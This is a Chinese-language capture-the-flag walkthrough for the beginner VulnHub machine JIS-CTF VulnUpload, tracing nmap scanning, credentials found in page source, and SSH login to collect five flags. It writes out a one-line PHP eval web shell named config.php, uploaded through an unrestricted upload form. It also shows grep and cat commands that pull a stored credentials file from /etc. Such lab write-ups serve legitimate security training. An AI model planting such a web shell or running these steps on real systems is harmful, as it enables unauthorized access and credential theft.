# Jordaninfosec-CTF01

## 一、描述

```text
VM名称：JIS-CTF：VulnUpload

难度：初学者

说明：本机上有五个标志。尝试找到它们。查找所有标志平均需要1.5个小时。

仅与VirtualBox一起使用

下载链接：https : //download.vulnhub.com/jisctf/JIS-CTF-VulnUpload-CTF01.ova
```

## 二、问题解决

环境一开始有问题，提示如下

![image-20210308103929620](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308103929620.png)

经审查应该是USB设备未找到，以及先前的网卡未找到

### 解决方案

1.先将网卡设置为本机自带的正在联网的网卡

![image-20210308103744711](C:%5CUsers%5Cyuhao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210308103744711.png)

2.随后将USB设备禁用

![image-20210308103816812](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308103816812.png)

即可正常打开虚拟机

## 三、开始训练

扫描本机网段，首先，查看本机IP

```text
ifconfig
```

![image-20210308113913196](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308113913196.png)

nmap扫描子网

```text
nmap 192.168.1.238/24
```

![image-20210308114052962](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308114052962.png)

发现有个IP开了80端口，尝试打开

![image-20210308114133792](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308114133792.png)

成功找到靶机IP

```text
192.168.1.236
```

使用nmap扫描此IP详细信息

```text
nmap -A 192.168.1.236
```

![image-20210308114320597](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308114320597.png)

发先robots.txt文件，并且其中有/flag

访问网页

![image-20210308114423280](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308114423280.png)

得到第一个flag

```text
The 1st flag is : {8734509128730458630012095}
```

将robots.txt中的网站访问一遍后，发现[http://192.168.1.236:80/admin\_area/页面显示如下](http://192.168.1.236:80/admin_area/页面显示如下)

![image-20210308114836865](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308114836865.png)

使用F12查看网页源代码

![image-20210308114915573](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308114915573.png)

发现用户名、密码以及第二个Flag

```text
username : admin
password : 3v1l_H@ck3r
The 2nd flag is : {7412574125871236547895214}
```

使用所得账户信息登陆网页

![image-20210308115201977](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308115201977.png)

显示如下

![image-20210308115234925](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308115234925.png)

判断为文件上传

编写一句话木马，命名为config.php

```text
<?php eval($_POST["giao"]);?>
```

尝试上传

![image-20210308115502795](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308115502795.png)

上传成功

联想到之前的robots.txt中的目录uploaded\_files

直接访问

```text
http://192.168.1.236/uploaded_files/config.php
```

访问成功

![image-20210308115944645](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308115944645.png)

使用蚁剑连接，填写URL和连接密码后，测试连接

![image-20210308120045605](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308120045605.png)

连接成功，成功进入后台

![image-20210308120338901](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308120338901.png)

在html目录下找到flag.txt，但是无法读取，需要root

之后在hint.txt文件中找到第三个flag

![image-20210308120523673](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308120523673.png)

```text
The 3rd flag is : {7645110034526579012345670}
```

以及一句提示

```text
try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)
```

让我找到

```text
technawi
```

这个用户的密码，并且提示在隐藏文件夹中

搜寻这个用户名

```text
grep -rns technawi /etc/
```

![image-20210308122605837](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308122605837.png)

发现一个txt文件中，含有username的字样

打开文件

```text
cat /etc/mysql/conf.d/credentials.txt
```

![image-20210308122651388](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308122651388.png)

得到第四个flag，以及用户名密码

```text
The 4th flag is : {7845658974123568974185412}
username : technawi
password : 3vilH@ksor
```

使用SSH连接，这里我们使用CRT

![image-20210308122843973](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308122843973.png)

连接成功

![image-20210308122857798](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308122857798.png)

找到flag.txt并打开

![image-20210308122944491](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210308122944491.png)

得到最后一个flag

```text
The 5th flag is : {5473215946785213456975249}

Good job :)

You find 5 flags and got their points and finish the first scenario....
```

靶机训练完成

